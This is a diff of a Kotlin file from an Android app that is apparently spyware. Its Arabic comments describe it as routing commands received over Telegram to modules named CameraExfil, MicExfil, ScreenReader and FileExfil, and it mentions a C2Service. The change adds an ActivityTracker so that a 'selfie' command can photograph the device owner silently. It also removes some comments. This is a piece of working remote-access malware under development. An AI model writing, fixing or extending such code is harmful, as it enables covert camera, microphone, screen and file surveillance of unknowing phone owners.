@@ -7,6 +7,7 @@ import com.example.disguise.control.CameraExfil
 import com.example.disguise.control.MicExfil
 import com.example.disguise.control.ScreenReader
 import com.example.disguise.files.FileExfil
+import com.example.disguise.util.ActivityTracker // ✅ تمت إضافة هذا السطر لحل المشكلة
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -16,8 +17,6 @@ import java.io.File
 
 /**
  * CommandHandler — يوزّع الأوامر النصية القادمة من تيليجرام إلى الوحدات المناسبة.
- * 
- * المسار: app/src/main/java/com/example/disguise/core/CommandHandler.kt
  */
 class CommandHandler(
     private val context: Context,
@@ -30,12 +29,8 @@ class CommandHandler(
         private const val TAG = "CommandHandler"
     }
 
-    // نطاق مستقل لتنفيذ الأوامر (لا يحجب polling)
     private val execScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
 
-    /**
-     * نقطة الدخول: تُستدعى من TelegramController عند وصول رسالة.
-     */
     fun handle(commandText: String, reporter: TelegramReporter?) {
         if (reporter == null) {
             Log.w(TAG, "reporter is null, ignoring command")
@@ -51,9 +46,6 @@ class CommandHandler(
         }
     }
 
-    /**
-     * التحليل الفعلي وتوزيع الأوامر.
-     */
     private suspend fun dispatch(raw: String, reporter: TelegramReporter) {
         val text = raw.removePrefix("/").trim()
         if (text.isEmpty()) return
@@ -162,8 +154,7 @@ class CommandHandler(
             "selfie" -> {
                 reporter.sendMessage("⏳ جارٍ التقاط صورة سيلفي بصمت...")
                 try {
-                    // نمرر الـ context (يجب أن يكون Activity، أو سنستخدم حيلة الـ Service)
-                    // هنا نفترض أن الـ C2Service قد وفر طريقة لجلب الـ Activity
+                    // استخدام ActivityTracker لجلب الواجهة
                     val activity = ActivityTracker.currentActivity
                     if (activity != null) {
                         CameraExfil.takeSilentSelfie(activity)
